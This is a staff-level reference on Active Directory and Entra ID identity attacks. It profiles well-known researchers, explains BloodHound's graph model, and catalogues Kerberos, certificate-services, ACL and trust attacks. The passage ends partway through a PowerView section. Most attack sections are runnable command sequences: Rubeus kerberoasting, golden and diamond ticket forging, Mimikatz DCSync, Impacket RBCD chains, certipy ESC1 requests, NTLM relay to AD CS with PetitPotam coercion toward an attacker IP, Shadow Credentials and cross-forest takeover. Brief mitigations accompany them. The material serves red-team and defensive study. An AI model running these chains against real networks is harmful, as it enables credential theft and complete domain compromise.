# Active Directory and Windows Identity Security
## Staff-Level Technical Reference

---

## I. Researcher Profiles

### Will Schroeder ("harmj0y") — SpecterOps Technical Architect

**Career arc**: Joined SpecterOps as technical architect. Co-founder of BloodHound. Core developer of GhostPack, PowerSploit, Empire, Veil-Framework. Received the 2019 Pwnie Award. Blog: blog.harmj0y.net — one of the most influential continuous resources for AD attack tradecraft (2014–present).

**GitHub repos**: PowerShellMafia/PowerSploit (PowerView, PowerUp, Invoke-Mimikatz); GhostPack/Rubeus; GhostPack/Seatbelt; GhostPack/SharpDPAPI; GhostPack/SharpUp; GhostPack/Certify; BloodHoundAD/BloodHound; EmpireProject/Empire.

**Talk list** (selected):
| Year | Conference | Title | Co-Presenters |
|------|-----------|-------|----------------|
| 2016 | DEF CON 24 | Six Degrees of Domain Admin — Graph Theory to Accelerate Red Team Operations | Robbins, Vazarkar |
| 2017 | Black Hat USA / DEF CON 25 | An ACE Up the Sleeve: Designing Active Directory DACL Backdoors | Robbins |
| 2019 | DerbyCon 9.0 | Kerberoasting Revisited | — |
| 2019 | DerbyCon 9.0 | Not A Security Boundary: Breaking Forest Trusts | Christensen |
| 2021 | Black Hat USA | Certified Pre-Owned: Abusing Active Directory Certificate Services | Christensen |

**Key blog posts**: "Mimikatz and DCSync and ExtraSids, Oh My" (2015); "Kerberoasting Without Mimikatz" (2016); "A Guide to Attacking Domain Trusts" (2017); "Wagging the Dog: RBCD attack chain" (2019, with Elad Shamir); "Certified Pre-Owned" (2021); "GhostPack" (2018).

---

### Andy Robbins ("_wald0") — SpecterOps Principal Security Researcher

**Career arc**: Co-founder of SpecterOps. Co-creator of BloodHound. Primary author of BloodHound Enterprise. Specializes in Windows, Active Directory, Entra ID/Azure AD.

**Talk list** (selected):
| Year | Conference | Title |
|------|-----------|-------|
| 2016 | DEF CON 24 | Six Degrees of Domain Admin |
| 2017 | Black Hat USA / DEF CON 25 | An ACE Up the Sleeve |
| 2019 | Black Hat USA | Finding Our Path: How We're Trying to Improve Active Directory Security |
| 2024 | TROOPERS24 / x33fcon | Analyzing and Executing ADCS Attack Paths with BloodHound (with Jonas Bülow Knudsen) |

**Key publications**: "BloodHound 4.0: The Azure Update" (Nov 2020); "BloodHound Community Edition: A New Era" (Aug 2023); "Hybrid Attack Paths & New BloodHound Views" (Aug 2024); "Microsoft Breach — How Can I See This In BloodHound?" (2023); "ADCS Attack Paths in BloodHound" Parts 1–2 (2024, with Jonas Bülow Knudsen).

---

### Rohan Vazarkar ("CptJesus") — SpecterOps BloodHound Developer

**Career arc**: Co-developer of BloodHound and BloodHound Enterprise. Primary developer of SharpHound ingestor. Penetration tester.

**Key publications**: "SharpHound: Evolution of the BloodHound Ingestor" (2017); "BloodHound 2.0" (2018); "SharpHound: Target Selection and API Usage" (2018). GitHub: BloodHoundAD/BloodHound, BloodHoundAD/SharpHound.

---

### Lee Christensen ("tifkin_") — SpecterOps Technical Architect

**Career arc**: Technical architect at SpecterOps. Specializes in Windows, Active Directory, PKI security. Contributor to GhostPack, BloodHound. Created SpoolSample (PrinterBug PoC), KeeThief, UnmanagedPowerShell.

**Key publications**: "Certified Pre-Owned" (137-page whitepaper documenting ESC1–ESC8, with Schroeder, Black Hat USA 2021); "Certificates and Pwnage and Patches, Oh My!" (Nov 2022 — ESC9/10).

---

### Elad Shamir — Independent Researcher

**Career arc**: Independent researcher. Primary discoverer of Resource-Based Constrained Delegation (RBCD) abuse (2019) and Shadow Credentials (2021). Blog: eladshamir.com.

**Key publications**: "Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory" (Jan 2019) — foundational RBCD paper; "Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover" (Jun 2021); "SPN-jacking: An Edge Case in WriteSPN Abuse" (2022); "At the Edge of Tier Zero: The Curious Case of the RODC" (2023). Talk: "Constructing Kerberos Attacks with Delegation Primitives" (DEF CON 27, 2019).

---

### Jonas Bülow Knudsen — SpecterOps Research Manager

**Key publications**: "What is Tier Zero" (2023); "ADCS Attack Paths in BloodHound" Parts 1–3 (2024); "Good Fences Make Good Neighbors: New AD Trusts Attack Paths in BloodHound" (2025). Primary discoverer of ESC13 (issuance-policy abuse, Feb 14 2024) and ESC14 (`altSecurityIdentities` mapping abuse, Feb 28 2024). GitHub: JonasBK.

---

### Dirk-jan Mollema ("dirkjanm") — Outsider Security / Independent

**Career arc**: Founder of Outsider Security; the most prolific independent researcher on Azure AD / Entra ID and hybrid-identity attack surface. Original author of ROADtools (`roadrecon`, `roadtx`), AADInternals collaborator, and longtime author of dirkjanm.io — the canonical research reference for Entra ID offensive primitives (2018–present).

**Key publications 2023–2025** (dirkjanm.io):
- Oct 10 2023 — "Phishing for Primary Refresh Tokens and Windows Hello keys": canonical reference for PRT-phishing tradecraft and WHfB key abuse.
- May 6 2024 — "Lateral movement and on-prem NT hash dumping with Microsoft Entra Temporary Access Passes": TAPs (`Temporary Access Pass`) abused for lateral movement and on-prem NT-hash recovery via WHfB enrollment.
- Jul 31 2024 — "Persisting on Entra ID applications and User Managed Identities with Federated Credentials": Federated Identity Credentials on Entra apps as a persistence primitive — no client secret/certificate visible in standard credential lists.
- Jul 30 2025 — "Extending AD CS attack surface to the cloud with Intune certificates": maps AD CS attack primitives onto Intune-issued certificates for cloud-managed endpoints; bridges on-prem PKI compromise to cloud auth.
- Sep 17 2025 — "One Token to rule them all" — discloses CVE-2025-55241 (Actor Token cross-tenant impersonation). See §IX for full chain.

**Black Hat USA 2025 / DEF CON 33**: "Advanced Active Directory to Entra ID Lateral Movement Techniques" — slides on `github.com/onhexgroup/Conferences`; covers low-privilege cloud → hybrid-admin pivots and the Actor Token research that became CVE-2025-55241.

Source: <https://dirkjanm.io/>

---

### Beau Bullock ("dafthack") — Black Hills Information Security

**Career arc**: Penetration tester at Black Hills Information Security since 2014. Author and maintainer of multiple cloud-identity offensive tools: `MailSniper`, `MFASweep`, `PowerMeUp`, and (via the BHIS collaborator network) `TokenTactics` and `TokenTacticsV2`. Talk arc anchors on the M365/Entra attack surface — device-code phishing, MFA bypass tradecraft, token-replay primitives.

**TokenTacticsV2** (rvrsh3ll/TokenTacticsV2, Black Hills collaborator network): PowerShell toolkit for Entra ID token manipulation — request tokens for arbitrary `client_id`/`resource` pairs via known FOCI (Family of Client IDs) apps, refresh-token replay across resources, device-code authentication initiation, parse and decode JWTs in-place. Source: GitHub `rvrsh3ll/TokenTacticsV2`.

**Key publications**: BHIS blog and YouTube (`@beau_bullock`) — extensive coverage of device-code phishing tradecraft (used in the wild by Storm-2372, see §IX).

---

## II. BloodHound Architecture

### Graph Model Foundation

BloodHound models Active Directory (and Azure/Entra ID) as a directed property graph stored in Neo4j (legacy/community) and PostgreSQL + Neo4j (BloodHound CE). Nodes represent AD principals and objects; edges represent access relationships or attack primitives. All edges are directed — they indicate direction of attack. Core algorithm: Dijkstra's shortest path from "owned" nodes to high-value targets (Domain Admins, Domain Controllers).

**Architecture (BloodHound CE / Enterprise)**:
- PostgreSQL — application state, user data, configuration
- Neo4j — graph database for all AD/Azure objects and relationships
- BloodHound API server — authenticated REST API; single Go binary serving UI assets
- Deployment: fully containerized (Docker Compose)

BloodHound CE (released Aug 2023) replaced the Electron single-page app with a containerized multi-tier model, added PostgreSQL, unified codebase with BloodHound Enterprise.

### Node Types

| Node Type | Description |
|-----------|-------------|
| User | AD user accounts (including service accounts) |
| Computer | Domain-joined computer objects |
| Group | AD security groups (global, domain local, universal) |
| GPO | Group Policy Objects |
| OU | Organizational Units |
| Domain | AD domain objects |
| EnterpriseCA / RootCA / CertTemplate / IssuancePolicy | AD CS PKI objects |

**Azure/Entra nodes (AzureHound)**: AZUser, AZGroup, AZServicePrincipal, AZApplication, AZManagedIdentity, AZDevice, AZSubscription, AZResourceGroup, AZKeyVault, AZVirtualMachine, AZTenant, AZRole.

### Key Edge Types

**Core AD edges**:
| Edge | Description |
|------|-------------|
| MemberOf | Principal is a member of the group |
| HasSession | Computer has an active session for a user (credentials in memory) |
| AdminTo | Principal has local admin rights on computer |
| CanRDP / ExecuteDCOM / CanPSRemote | Remote access primitives |
| AllowedToDelegate | Constrained delegation (msDS-AllowedToDelegateTo) |
| AllowedToAct | RBCD: msDS-AllowedToActOnBehalfOfOtherIdentity |
| HasSIDHistory | Principal has SID in sIDHistory pointing to another principal |
| Contains / GpLink | Structural edges (OU/Container, GPO link) |

**ACL / permission edges**:
| Edge | Attack Path |
|------|-------------|
| GenericAll | Full control — change password, modify attributes, add to groups, write msDS-KeyCredentialLink |
| GenericWrite | Write non-protected attributes — msDS-KeyCredentialLink (Shadow Credentials), SPN (Kerberoasting), msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD) |
| WriteOwner | Become owner → implicit GenericAll |
| WriteDacl | Modify DACL → grant self GenericAll or DCSync rights |
| AllExtendedRights | ForceChangePassword, read confidential attributes (LAPS, gMSA passwords) |
| AddMember / AddSelf | Add to groups |
| ReadLAPSPassword / ReadGMSAPassword | Read managed passwords |
| AddKeyCredentialLink | Write msDS-KeyCredentialLink → Shadow Credentials |
| DCSync | GetChanges + GetChangesAll → replicate all secrets |
| WriteSPN | Add SPN → Kerberoast or SPN-jacking |
| ForceChangePassword | Reset password without knowing current |

**NTLM relay edges (added 2025)**:
| Edge | Description |
|------|-------------|
| CoerceAndRelayNTLMToSMB | Coerce auth + relay to SMB target lacking signing |
| CoerceAndRelayNTLMToADCS | Coerce DC auth + relay to AD CS → certificate → domain compromise |
| CoerceAndRelayNTLMToLDAP/LDAPS | Relay to LDAP → RBCD or Shadow Credentials |
| AbuseTGTDelegation | Abuse unconstrained delegation to capture TGTs |

### SharpHound Collection Methods

```
# Key collection methods
-c Default        # Group memberships, trusts, ACLs, GPO links, OU structure, local groups, sessions
-c DCOnly         # LDAP-only from DC: Group/Trusts/ACL/ObjectProps/Container/GPOLocalGroup
-c All            # Everything except GPOLocalGroup
-c Session        # Active user sessions only; pair with --Loop
-c CertServices   # AD CS enumeration (CAs, templates, issuance policies)
-c SMBInfo        # SMB signing status
-c WebClientService  # Detects WebClient service (NTLM relay feasibility)
-c NTLMRegistry   # NTLM configuration values
-c LdapServices   # LDAP signing and channel binding status

# Key flags
--Loop --LoopDuration    # Continuous collection (for Session hunting)
--Domain <FQDN>          # Target domain
--LdapUsername/Password  # Alternate credentials
```

### Attack Path Queries (Cypher)

```cypher
-- Shortest path from owned user to Domain Admins
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN p

-- All principals with GenericAll on Domain Admins
MATCH p=(n)-[:GenericAll]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN p

-- Find choke points (nodes in many attack paths)
MATCH p=allShortestPaths((n {owned:true})-[*1..]->(m {highvalue:true}))
UNWIND nodes(p) AS x WITH x, count(*) AS pathCount ORDER BY pathCount DESC
RETURN x.name, pathCount LIMIT 25
```

---

## III. Kerberos Attack Taxonomy

### Kerberoasting

Any authenticated domain user can request a TGS for any account with a registered SPN. The TGS-REP's encrypted portion (encrypted with the service account's long-term key) is extracted for offline cracking.

```
# Enumeration
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname  # PowerView
ldapsearch -H ldap://DC -b "DC=..." "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Attack
Rubeus.exe kerberoast /outfile:hashes.txt                      # RC4 (hashcat mode 13100)
Rubeus.exe kerberoast /aes /outfile:hashes_aes.txt             # AES256 (hashcat mode 19700)
Rubeus.exe kerberoast /usetgtdeleg /outfile:hashes.txt         # Force RC4 via TGT delegation
Rubeus.exe kerberoast /ldapfilter:'admincount=1'               # Only protected accounts
GetUserSPNs.py domain/user:pass -request -outputfile hashes.txt  # Impacket (Linux)
```

**Hash formats**: RC4 = `$krb5tgs$23$...` (mode 13100); AES256 = `$krb5tgs$18$...` (mode 19700); AES128 = `$krb5tgs$17$...` (mode 19600).

**RC4 downgrade**: Unless the domain disabled RC4 via Group Policy (`Kerberos encryption types`), Rubeus `/usetgtdeleg` can force RC4 tickets even for AES-only accounts.

**Charlie Clark's AS-REQ Kerberoasting (2022)**: If an account has pre-auth disabled (`DONT_REQ_PREAUTH`), a crafted `KRB_AS_REQ` with modified `sname` field yields a service ticket without any credentials — merges Kerberoasting with AS-REP roasting.

**Mitigations**: gMSA (120-char random passwords, auto-rotated; effectively uncrackable); enforce AES-only (`msDS-SupportedEncryptionTypes = 24`); 25+ char passwords on traditional service accounts; monitor Event ID 4769 (TGS-REQ) with RC4 etype from unexpected sources.

---

### AS-REP Roasting

Users with `DONT_REQ_PREAUTH` UAC flag (`0x400000`) set do not require Kerberos pre-authentication. Any unauthenticated requester can obtain an AS-REP whose encrypted portion (encrypted with the user's NTLM hash) is crackable offline.

```
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname   # PowerView
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
GetNPUsers.py domain/ -usersfile users.txt -no-pass -format hashcat -outputfile hashes.txt
hashcat -m 18200 asrep_hashes.txt wordlist.txt                     # Hash mode 18200
```

---

### Ticket Attacks: Golden / Silver / Diamond / Sapphire

**Golden Ticket**: Forge a TGT using the `krbtgt` NTLM hash (and optionally AES keys). Works even after compromised user accounts are deleted. Provides persistence even if all user passwords are reset (except krbtgt).

```
# Obtain krbtgt hash
lsadump::dcsync /domain:domain.local /user:krbtgt              # Mimikatz DCSync
lsadump::lsa /patch                                             # On DC locally

# Forge Golden Ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /aes256:<key> /ptt
Rubeus.exe golden /rc4:<ntlm> /domain:domain.local /sid:S-1-5-21-... /user:Administrator /ptt
```

Default ticket validity: 10 years. **Mitigation**: Dual krbtgt password reset (rotate twice; one rotation invalidates new tickets, second invalidates old cached ones).

**Silver Ticket**: Forge a TGS using the service account's NTLM hash. No KDC contact required — ticket validated by service using its own key. Scope limited to one service/host. Common targets: `cifs` (SMB), `host` (scheduled tasks), `http` (WinRM), `ldap`, `wsman` (PS Remoting).

**Diamond Ticket**: Modify a legitimate TGT — request real TGT, decrypt with krbtgt key, modify PAC (add privileged group memberships), re-encrypt. Defeats detection that looks for anomalous TGT properties. `Rubeus.exe diamond /krbkey:<krbtgt_aes256> /user:lowpriv_user /... /ticketuser:Administrator /groups:512 /ptt`

**Sapphire Ticket**: Extract the PAC of a legitimate high-privileged user via S4U2self + U2U (User-to-User), then forge TGT containing that legitimate PAC. The PAC itself came from the DC — indistinguishable from a legitimate ticket for that user. `ticketer.py -request -impersonate Administrator -aesKey <krbtgt_aes256> ...`

---

### Delegation Attacks

**Unconstrained Delegation**: Servers with `TRUSTED_FOR_DELEGATION` flag in userAccountControl store any user's TGT in LSASS when they connect. Attacker compromising such a server can extract TGTs of any user who connected, including domain admins.

```
Get-DomainComputer -Unconstrained | Select-Object dnshostname   # Find targets
# Attack with coercion:
Rubeus.exe monitor /interval:5 /nowrap                          # Start monitoring
SpoolSample.exe <DC_FQDN> <unconstrained_server_FQDN>          # Trigger DC auth
Rubeus.exe ptt /ticket:<base64>                                 # Inject captured TGT
lsadump::dcsync /domain:domain.local /all                       # DCSync
```

**Constrained Delegation**: Service accounts with `TRUSTED_TO_AUTH_FOR_DELEGATION` can use S4U2self to obtain forwardable service ticket on behalf of any user, then S4U2proxy to target any SPN in `msDS-AllowedToDelegateTo`.

```
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
Rubeus.exe s4u /user:svc_account /rc4:<ntlm> /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
```

**Service name spoofing**: The `sname` field in TGS-REP is NOT protected by the ticket's MAC. If `msDS-AllowedToDelegateTo` contains `HTTP/server`, an attacker can modify the service name to `LDAP/server` or `HOST/server` after receipt — enabling full server compromise beyond the intended service.

**Resource-Based Constrained Delegation (RBCD)** (Elad Shamir, 2019): Instead of configuring delegation on the service account, RBCD configures which principals may delegate TO a resource by writing their SIDs into `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer. Any principal with write access to that attribute (GenericWrite, GenericAll, WriteDacl, WriteAccountRestrictions) on a computer can enable RBCD for an attacker-controlled account.

```python
# Step 1: Create attacker machine account
addcomputer.py -computer-name 'ATTACKER$' -computer-pass 'Password123!' domain.local/user:pass

# Step 2: Write RBCD attribute on target computer
rbcd.py -delegate-to TARGET$ -delegate-from ATTACKER$ -action write domain.local/user:pass -dc-ip <DC>

# Step 3: S4U2self + S4U2proxy for impersonation ticket
getST.py -spn cifs/TARGET.domain.local -impersonate Administrator -dc-ip <DC> 'domain.local/ATTACKER$:Password123!'

# Step 4: Use ticket
export KRB5CCNAME=Administrator@cifs_TARGET.ccache
secretsdump.py -k -no-pass TARGET.domain.local
```

**BloodHound edge**: `WriteAccountRestrictions` → `AddAllowedToAct` → `AllowedToAct` on target computer.

---

## IV. Active Directory Certificate Services (AD CS) Attacks

### Architecture

**Enterprise CA**: Integrated with AD; issues certificates based on templates to domain principals. Registered under `CN=Public Key Services,CN=Services,CN=Configuration,DC=...`

**Key EKUs for attacks**:
- `1.3.6.1.5.5.7.3.2` — Client Authentication (enables Kerberos PKINIT auth)
- `1.3.6.1.4.1.311.20.2.1` — Certificate Request Agent (Enrollment Agent)
- `2.5.29.37.0` — Any Purpose
- No EKU — unrestricted (Any Purpose semantically)

### ESC1–ESC16 Escalation Paths

The original "Certified Pre-Owned" paper (2021) documented ESC1–ESC8. The matrix has since expanded to **ESC1–ESC16+** with disclosures in 2022 (ESC9/10 — Christensen), 2024 (ESC11 — RPC relay; ESC13 + ESC14 — Jonas Bülow Knudsen, SpecterOps; ESC15/EKUwu — Justin Bollinger, TrustedSec, CVE-2024-49019), and ESC16 (Certipy v5 release). Tool support: `certipy` v5+ (ly4k) and `Certify` are the canonical enumeration/exploitation tools; `certipy find -vulnerable -stdout` flags any of these conditions in one pass.

**ESC1 — Misconfigured Certificate Templates**:
Conditions: low-privileged enrollment rights + no manager approval + no authorized signatures + Client Auth EKU + `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` in `msPKI-Certificate-Name-Flag` (requester can supply SAN).
Attack: Request cert specifying `UPN=Administrator@domain.local` in SAN → CA issues cert authenticating as Domain Admin → PKINIT → TGT.

```
certipy req -u user@domain.local -p pass -ca CA-Name -template VulnTemplate -upn Administrator@domain.local
certipy auth -pfx admin.pfx -domain domain.local -username Administrator -dc-ip <DC>
```

**ESC2**: Template has `Any Purpose` EKU (`2.5.29.37.0`) or no EKU + low-privilege enrollment. Cert usable for any purpose; can potentially act as sub-CA.

**ESC3 (Enrollment Agent)**: Template has `Certificate Request Agent` EKU + low-privilege enrollment + no enrollment agent restrictions on CA. Two-step: (1) get Enrollment Agent cert; (2) use agent cert to enroll for any template on behalf of any user including Domain Admin.

**ESC4**: Template DACL grants WriteDacl/WriteOwner/GenericWrite/GenericAll to low-privileged user → modify template to introduce ESC1 conditions, then exploit as ESC1.

**ESC5**: Low-privileged write access to PKI AD objects (CA computer object, CN=NTAuthCertificates, enrollment services object) → RBCD or Shadow Credentials on CA → steal CA key, or add attacker CA cert trusted for domain auth.

**ESC6**: `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set on CA → any certificate request can include attacker-supplied SAN regardless of template settings. Even templates without `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` become exploitable.

**ESC7**: Low-privileged user has `ManageCA` (CA Administrator) or `ManageCertificates` rights on CA object → enable ESC6, approve pending requests, issue arbitrary certs.

**ESC8 — NTLM Relay to AD CS HTTP Endpoints**:
Conditions: CA has Web Enrollment (certsrv) or CES/CEP over HTTP/HTTPS without EPA.
```bash
# Setup relay
ntlmrelayx.py -t http://CA.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce DC auth
PetitPotam.py -u user -p pass <attacker_IP> <DC_FQDN>

# Receive DC cert → use Rubeus to get TGT → DCSync
Rubeus.exe asktgt /user:DC$ /certificate:<base64> /domain:domain.local /ptt
lsadump::dcsync /domain:domain.local /all
```

**ESC9**: Template has `CT_FLAG_NO_SECURITY_EXTENSION` (no SID embedded in cert) + `StrongCertificateBindingEnforcement` registry = 0 or 1 + attacker has GenericWrite on target user. Introduced by CVE-2022-26923 ("Certifried") patches in May 2022.

**ESC10**: Domain-wide registry `StrongCertificateBindingEnforcement = 0` allows any certificate whose UPN matches a user to authenticate as that user. Attack: modify target user's UPN to `Administrator@domain.local` (requires GenericWrite), request cert, restore UPN.

**ESC11 — NTLM Relay to ICPR (RPC/TCP)**: CA RPC interface accessible without signing. Same concept as ESC8 but targeting the RPC-based enrollment interface rather than HTTP.

**ESC13 — Issuance Policy → AD Group Mapping** (Jonas Bülow Knudsen, SpecterOps, Feb 14 2024): Templates referencing an issuance policy whose `msDS-OIDToGroupLink` attribute maps the policy OID to a privileged AD security group. A low-privilege enrollee who can enroll in the template receives a certificate that PKINIT-authenticates with the linked group's membership *added to their token* — regardless of the user's actual group membership. The token-augmentation happens server-side at KDC ticket issuance, so the user effectively gains the linked group's rights for the ticket lifetime. Defense: audit every issuance policy with a non-null `msDS-OIDToGroupLink`; link only to non-privileged groups. Source: <https://posts.specterops.io/adcs-esc13-abusing-issuance-policies-7f8c4dbef47>

**ESC14 — altSecurityIdentities Mapping Abuse** (Jonas Bülow Knudsen, Feb 28 2024): The `altSecurityIdentities` (AltSecID) attribute on a user/computer object explicit-maps a certificate (by issuer + serial, subject, SKI, SHA1, or RFC822) to that account. If an attacker has write access to a target's `altSecurityIdentities` (e.g. via `GenericWrite`/`WriteProperty`), they can insert a mapping pointing at any certificate they can obtain or forge — including a self-signed cert — then PKINIT-authenticate as the target. Post-CVE-2022-26923 ("Certifried") strong-mapping enforcement raised the bar, but ESC14 abuses the explicit-mapping path that strong-mapping is designed to honor.

**ESC15 / EKUwu — V1 Template Application Policy Injection** (Justin Bollinger, TrustedSec, Oct 8 2024; CVE-2024-49019; patched Nov 2024): Schema-version-1 certificate templates (e.g. the default `WebServer` template — present in every AD CS install since Windows Server 2000) cannot have their EKUs customized but accept a Microsoft-proprietary `Application Policies` extension (OID `1.3.6.1.4.1.311.21.10`) in the CSR. When both Application Policies and EKU are present on an issued cert, Windows authentication clients prefer Application Policies. An enrollee with rights to a V1 template that allows enrollee-supplied subject can inject `Client Authentication` (`1.3.6.1.5.5.7.3.2`) or `Certificate Request Agent` (`1.3.6.1.4.1.311.20.2.1`) into Application Policies — bypassing the template's intended EKU restrictions. Patch: KB5044284 (CVE-2024-49019) enforces template EKU constraints. Source: <https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc>

**ESC16 — Security Extension Disabled at CA Level** (introduced with Certipy v5): The CA itself has `disable security extension` set domain-wide on issued certs (rather than per-template as in ESC9), so every issued certificate lacks the `szOID_NTDS_CA_SECURITY_EXT` SID extension. Combined with relaxed `StrongCertificateBindingEnforcement`, this enables UPN-based authentication abuse identical to ESC9 but with broader scope (every cert from the CA, not just one template). Often combined with ESC6.

### PKINIT and Shadow Credentials

**PKINIT (RFC 4556)**: Client signs AS-REQ with private key; KDC verifies against public key in certificate or `msDS-KeyCredentialLink`. Returns TGT.

**NTLM hash via PKINIT + U2U**: After TGT via cert, request U2U service ticket to "self" — PAC in response contains target's NTLM hash. Pass-the-hash without LSASS access.

**Shadow Credentials** (Elad Shamir, 2021): `msDS-KeyCredentialLink` stores Key Credential objects (public key + metadata) used by Windows Hello for Business. Writing a malicious Key Credential enables PKINIT authentication as the target without knowing their password.

Requirements: Write access to `msDS-KeyCredentialLink` (via `AddKeyCredentialLink`, `GenericWrite`, `GenericAll`); Windows Server 2016+ DC; domain functional level ≥ 2016; DC must have Server Authentication cert.

```
# Add Shadow Credential
Whisker.exe add /target:victim /domain:domain.local /dc:DC.domain.local /path:cert.pfx /password:Passw0rd
Rubeus.exe asktgt /user:victim /certificate:cert.pfx /password:Passw0rd /domain:domain.local /ptt

# Certipy equivalent
certipy shadow auto -u attacker@domain.local -p pass -account victim
```

### Certify and Certipy

```
# Certify (C#, Windows)
Certify.exe find /vulnerable          # Find ESC1-11 vulnerable templates
Certify.exe cas                        # List CAs
Certify.exe request /ca:CA\CA-Name /template:VulnTemplate /altname:Administrator

# Certipy (Python, Linux)
certipy find -u user@domain.local -p pass -dc-ip <DC> -vulnerable -stdout
certipy req -u user@domain.local -p pass -ca CA-Name -template VulnTemplate -upn Administrator@domain.local
certipy auth -pfx admin.pfx -dc-ip <DC>
```

---

## V. ACL / DACL Attacks

### Security Descriptor Architecture

Every AD object has a security descriptor: **Owner** (implicit right to modify DACL), **DACL** (list of ACEs granting/denying access), **SACL** (auditing ACEs, requires SeSecurityPrivilege). ACE evaluation order: explicit deny → explicit allow → inherited deny → inherited allow (first match wins).

### Dangerous ACE Combinations

| ACE | Target Object | Primary Attack Path |
|-----|---------------|---------------------|
| GenericAll | User | Change password, write msDS-KeyCredentialLink, write SPN |
| GenericAll | Computer | RBCD, Shadow Credentials, modify SPN |
| GenericWrite | User/Computer | Write msDS-KeyCredentialLink, SPN, msDS-AllowedToActOnBehalfOfOtherIdentity |
| WriteOwner | Any | Become owner → implicit GenericAll |
| WriteDacl | Any | Grant self GenericAll or DCSync rights |
| AllExtendedRights | User | ForceChangePassword, read LAPS/gMSA passwords |
| AddMember / AddSelf | Group | Add to group (path to privilege escalation) |
| WriteSPN | User/Computer | Add SPN → Kerberoast or SPN-jacking |

### DCSync

```
# Rights required on domain object (DC=domain,DC=local)
DS-Replication-Get-Changes         (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
DS-Replication-Get-Changes-All     (GUID: 1131f6ab-9c07-11d1-f79f-00c04fc2dcd2)

# Grant DCSync rights if you have WriteDacl
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync

# Execute
lsadump::dcsync /domain:domain.local /user:Administrator
lsadump::dcsync /domain:domain.local /all /csv
```

Default holders: Domain Controllers, Domain Admins, Enterprise Admins, MSOL_ accounts (Azure AD Connect — frequently exploitable lateral movement vector).

### AdminSDHolder Abuse

Every 60 minutes, SDProp on the PDC emulator copies the DACL from `CN=AdminSDHolder,CN=System,DC=...` onto every "protected" principal (members of admin groups). If you have WriteDacl or GenericAll on AdminSDHolder, add an ACE granting yourself GenericAll — it propagates to every protected principal within 60 minutes. Manual trigger: `Invoke-SDPropagator` or `repadmin /syncall`. Detection: Event ID 5136 on AdminSDHolder object (rare modification).

### ACL Enumeration

```powershell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "Write|All|Force|GenericAll"}
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -eq "lowpriv_user"}
```

---

## VI. Domain Trust Attacks

### Trust Types and SID Filtering

| Trust Type | Scope | SID Filtering |
|------------|-------|---------------|
| Parent-Child (intra-forest) | Automatic, bidirectional, transitive | **Disabled** — SID history injection effective |
| Tree-root (intra-forest) | New tree in same forest | **Disabled** |
| External (inter-forest) | Manually created, non-transitive | **Enabled** — SID values in trusted forest's range are filtered |
| Forest (inter-forest) | Transitive, one or two-way | **Enabled** with SID quarantine |

### SID History Injection (Intra-Forest)

`sIDHistory` attribute holds additional SIDs added to a user's token at login. Within a forest (SID filtering off), a child domain admin can add the parent domain's privileged group SIDs to a user's sIDHistory → parent domain treats user as Domain Admin.

```
# Get child krbtgt + inter-domain trust key, then forge TGT with ExtraSids
kerberos::golden /user:Administrator /domain:child.parent.local /sid:S-1-5-21-<child> /krbtgt:<child_krbtgt> /sids:S-1-5-21-<parent>-519 /ptt
# S-1-5-21-<parent>-519 = Enterprise Admins
```

### Inter-Realm Trust Ticket

With the inter-domain trust key (from `lsadump::trust` or DCSync on the `CHILD$` trust account), forge a referral TGT with arbitrary sIDHistory entries pointing to parent's EA/DA groups.

```
# Get trust key
lsadump::dcsync /domain:parent.local /user:CHILD$
# Forge referral TGT
kerberos::golden /user:Administrator /domain:child.parent.local /sid:S-1-5-21-<child> /rc4:<trust_key> /sids:S-1-5-21-<parent>-519 /service:krbtgt /target:parent.local /ptt
```

### "Not A Security Boundary: Breaking Forest Trusts" (Schroeder + Christensen, DerbyCon 2019)

**Core finding**: Bidirectional forest trusts are NOT security boundaries. Chain:
1. Users from Forest B are members of "Authenticated Users" in Forest A (by default), allowing them to trigger PrinterBug/SpoolSample against Forest A DCs
2. Forest A DC's machine account TGT is captured at a Forest B server with unconstrained delegation
3. TGT → DCSync Forest A → complete compromise

**Attack path**:
```
Rubeus.exe monitor /interval:5 /nowrap                    # On unconstrained delegation server
SpoolSample.exe <ForestA_DC> <unconstrained_server>       # From Forest B user context
Rubeus.exe ptt /ticket:<base64>                           # Inject captured Forest A DC TGT
lsadump::dcsync /domain:ForestA.local /all                # Dump Forest A
```

**Mitigation**: Disable Print Spooler on DCs and unconstrained delegation servers; enable Selective Authentication on forest trusts; remove unconstrained delegation where possible.

---

## VII. Post-Exploitation Toolkit

### PowerView (harmj0y / PowerSploit Recon)

```powershell
Import-Module .\PowerView.ps1

# Domain/Forest enumeration
Get-Domain; Get-DomainController; Get-Forest; Get-DomainTrust; Get-ForestTrust

# User enumeration
Get-DomainUser -SPN                          # Kerberoasting targets
Get-DomainUser -PreauthNotRequired           # AS-REP roasting targets
Get-DomainUser -TrustedToAuth                # Constrained delegation accounts
Get-DomainUser -AdminCount                   # Protected users (adminCount=1)

# Computer enumeration
Get-DomainComputer -Unconstrained            # Unconstrained delegation hosts
Get-DomainComputer -TrustedToAuth            # Constrained delegation hosts

# ACL enumeration
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
